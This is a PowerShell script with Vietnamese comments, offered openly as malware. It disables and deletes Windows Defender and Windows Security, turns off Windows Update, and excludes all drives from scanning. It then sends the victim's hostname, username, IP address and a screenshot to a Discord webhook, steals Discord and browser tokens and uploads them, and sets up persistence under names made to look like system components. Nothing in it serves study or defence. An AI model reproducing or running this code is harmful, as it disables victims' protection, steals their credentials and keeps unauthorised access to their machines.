# payload_killer.ps1 - Xóa Defender & Security trước tiên
$webhook = "https://discord.com/api/webhooks/ID_CUA_BAN/TOKEN"

# ========== PHẦN 1: TIÊU DIỆT WINDOWS DEFENDER & SECURITY NGAY LẬP TỨC ==========

# Gửi thông báo bắt đầu tấn công
try {
    $msg = @{content = "🔥 ĐANG TIÊU DIỆT WINDOWS DEFENDER..."} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json"
} catch {}

# 1. Tắt Real-time Protection và tất cả tính năng
$defender_cmds = @(
    'Set-MpPreference -DisableRealtimeMonitoring $true',
    'Set-MpPreference -DisableBehaviorMonitoring $true',
    'Set-MpPreference -DisableBlockAtFirstSeen $true',
    'Set-MpPreference -DisableIOAVProtection $true',
    'Set-MpPreference -DisablePrivacyMode $true',
    'Set-MpPreference -DisableArchiveScanning $true',
    'Set-MpPreference -DisableIntrusionPreventionSystem $true',
    'Set-MpPreference -DisableScriptScanning $true',
    'Set-MpPreference -DisableNetworkProtection $true',
    'Set-MpPreference -DisableCatchupFullScan $true',
    'Set-MpPreference -DisableCatchupQuickScan $true',
    'Set-MpPreference -SubmitSamplesConsent 2',
    'Set-MpPreference -MAPSReporting 0',
    'Set-MpPreference -PUAProtection 0',
    'Set-MpPreference -CloudTimeout 1',
    'Set-MpPreference -CloudBlockLevel 0'
)
foreach ($cmd in $defender_cmds) {
    try { powershell -Command $cmd -ErrorAction SilentlyContinue } catch {}
}

# 2. Kill processes
$procs = @('MsMpEng.exe', 'SecurityHealthService.exe', 'MsSense.exe', 'NisSrv.exe', 'MpCmdRun.exe')
foreach ($p in $procs) {
    try { taskkill /f /im $p -ErrorAction SilentlyContinue } catch {}
}

# 3. Xóa service (ngăn khởi động lại)
$services = @('WinDefend', 'SecurityHealthService', 'WdNisSvc', 'WdBoot', 'WdFilter', 'WdNisDrv')
foreach ($svc in $services) {
    try { 
        sc.exe stop $svc
        sc.exe config $svc start= disabled
    } catch {}
}

# 4. XÓA FILE WINDOWS DEFENDER (nguồn gốc)
$defender_paths = @(
    "$env:ProgramFiles\Windows Defender",
    "$env:ProgramFiles(x86)\Windows Defender",
    "$env:WinDir\System32\Windows Defender",
    "$env:WinDir\System32\SecurityHealthService.exe",
    "$env:WinDir\System32\SecurityHealthSystray.exe",
    "$env:WinDir\System32\MsMpEng.exe",
    "$env:WinDir\System32\MsSense.exe"
)
foreach ($path in $defender_paths) {
    try {
        if (Test-Path $path) {
            if (Test-Path $path -PathType Container) {
                Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            } else {
                Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
            }
        }
    } catch {}
}

# 5. XÓA REGISTRY WINDOWS DEFENDER
$reg_paths = @(
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
    "HKLM:\SOFTWARE\Microsoft\Windows Defender",
    "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend",
    "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Windows Defender"
)
foreach ($reg in $reg_paths) {
    try { Remove-Item -Path $reg -Recurse -Force -ErrorAction SilentlyContinue } catch {}
}

# 6. Xóa Windows Security Center
try {
    # Xóa Security Center khỏi Registry
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Security Health" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Recurse -Force -ErrorAction SilentlyContinue
    
    # Xóa file Windows Security
    $security_files = @(
        "$env:WinDir\System32\SecurityHealth*.exe",
        "$env:WinDir\System32\SecurityCenter*.dll"
    )
    foreach ($pattern in $security_files) {
        try { Remove-Item -Path $pattern -Force -ErrorAction SilentlyContinue } catch {}
    }
} catch {}

# 7. Disable Windows Update (ngăn Defender tự cài lại)
try {
    sc.exe stop wuauserv
    sc.exe config wuauserv start= disabled
} catch {}

# 8. Thêm exclusion cho toàn bộ ổ đĩa
$drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root
foreach ($drive in $drives) {
    try { Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue } catch {}
}

# Gửi thông báo đã tiêu diệt thành công
try {
    $msg = @{content = "✅ WINDOWS DEFENDER & SECURITY ĐÃ BỊ TIÊU DIỆT"} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json"
} catch {}

# ========== PHẦN 2: THU THẬP THÔNG TIN ==========

$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
try { $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content } catch { $ip = "Unknown" }

$msg = @{content = "**🔴 NEW VICTIM - NO DEFENDER**`n🖥️ Hostname: $hostname`n👤 User: $username`n🌐 IP: $ip`n📅 Time: $time"} | ConvertTo-Json
try { Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json" } catch {}

# Chụp màn hình
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
    $ssPath = "$env:TEMP\screenshot.png"
    $bmp.Save($ssPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    Invoke-RestMethod -Uri $webhook -Method Post -InFile $ssPath -ContentType "multipart/form-data"
    Remove-Item $ssPath
} catch {}

# Đánh cắp token
$tokens = @()
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
    "$env:APPDATA\discord\Local Storage\leveldb"
)
$regex = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
foreach ($p in $paths) {
    if (Test-Path $p) {
        Get-ChildItem $p -Filter *.log -ErrorAction SilentlyContinue | ForEach-Object {
            $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            $m = [regex]::Matches($c, $regex)
            foreach ($match in $m) { $tokens += $match.Value }
        }
    }
}
$tokens = $tokens | Select-Object -Unique
if ($tokens.Count -gt 0) {
    $body = @{content = "🎯 Tokens: " + ($tokens -join ", ")} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
}

# Tạo và gửi ZIP
$zipPath = "$env:TEMP\$hostname.zip"
try {
    Compress-Archive -Path $ssPath -DestinationPath $zipPath -Force
    if ($tokens.Count -gt 0) {
        $tokenFile = "$env:TEMP\tokens.txt"
        $tokens | Out-File $tokenFile
        Compress-Archive -Path $tokenFile -DestinationPath $zipPath -Update
        Remove-Item $tokenFile
    }
    Invoke-RestMethod -Uri $webhook -Method Post -InFile $zipPath -ContentType "multipart/form-data"
    Remove-Item $zipPath
} catch {}

# ========== PHẦN 3: PERSISTENCE - KHỞI ĐỘNG CÙNG WINDOWS ==========

# Thêm vào Registry (nhiều lớp)
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value (Get-Item $PSCommandPath).FullName
} catch {}

try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    Set-ItemProperty -Path $regPath -Name "SystemRepair" -Value (Get-Item $PSCommandPath).FullName
} catch {}

try {
    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    Copy-Item -Path (Get-Item $PSCommandPath).FullName -Destination "$startup\SystemHelper.ps1" -Force
} catch {}

# ========== KẾT THÚC ==========
